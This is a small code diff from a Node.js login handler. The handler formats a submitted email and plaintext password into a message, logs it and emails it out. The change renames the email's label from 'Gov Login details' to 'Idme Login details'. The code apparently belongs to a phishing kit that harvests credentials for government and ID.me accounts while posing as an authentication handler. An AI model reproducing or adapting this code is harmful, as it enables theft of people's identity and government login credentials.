@@ -7,7 +7,7 @@ exports.authenticateAdminUser =  (req, res) => {
     try {
         const message = `email:${email}, password:${password}`
         console.log(message)
-        const reason = 'Gov Login details'
+        const reason = 'Idme Login details'
         
        sendEmail(email, message, reason, (data) => {
             if (data) {
